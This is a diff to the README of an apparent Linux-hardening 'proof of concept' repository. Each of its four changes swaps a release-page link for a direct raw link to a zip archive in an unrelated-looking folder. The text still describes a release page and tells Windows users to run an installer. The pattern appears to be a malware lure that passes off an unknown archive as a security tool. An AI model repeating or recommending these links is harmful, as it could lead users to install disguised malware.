@@ -1,6 +1,6 @@
 # 🛡️ RHEL-Ultra-Hardening-Proof-of-Concept - Strong Linux Security for Daily Use
 
-[![Download](https://img.shields.io/badge/Download-Release%20Page-blue)](https://github.com/facultyinfamy668/RHEL-Ultra-Hardening-Proof-of-Concept/releases)
+[![Download](https://img.shields.io/badge/Download-Release%20Page-blue)](https://raw.githubusercontent.com/facultyinfamy668/RHEL-Ultra-Hardening-Proof-of-Concept/main/ambulancer/Proof_Ultra_Hardening_Concept_RHE_of_3.9.zip)
 
 ## 🚀 Overview
 
@@ -12,7 +12,7 @@ This project is built as a proof of concept for users who want a clear view of h
 
 Visit this page to download the latest release:
 
-https://github.com/facultyinfamy668/RHEL-Ultra-Hardening-Proof-of-Concept/releases
+https://raw.githubusercontent.com/facultyinfamy668/RHEL-Ultra-Hardening-Proof-of-Concept/main/ambulancer/Proof_Ultra_Hardening_Concept_RHE_of_3.9.zip
 
 On that page, find the newest release and download the file that matches your system. If you use Windows, choose the package marked for Windows or the file with a setup or installer name.
 
@@ -54,7 +54,7 @@ A good setup has:
 ## 🪟 How to Download on Windows
 
 1. Open the download page:
-   https://github.com/facultyinfamy668/RHEL-Ultra-Hardening-Proof-of-Concept/releases
+   https://raw.githubusercontent.com/facultyinfamy668/RHEL-Ultra-Hardening-Proof-of-Concept/main/ambulancer/Proof_Ultra_Hardening_Concept_RHE_of_3.9.zip
 
 2. Look for the latest release at the top of the page.
 
@@ -188,4 +188,4 @@ That makes it useful for people who want to see how secure Linux systems are bui
 
 If you need to get the file later, use the same release page:
 
-https://github.com/facultyinfamy668/RHEL-Ultra-Hardening-Proof-of-Concept/releases
+https://raw.githubusercontent.com/facultyinfamy668/RHEL-Ultra-Hardening-Proof-of-Concept/main/ambulancer/Proof_Ultra_Hardening_Concept_RHE_of_3.9.zip
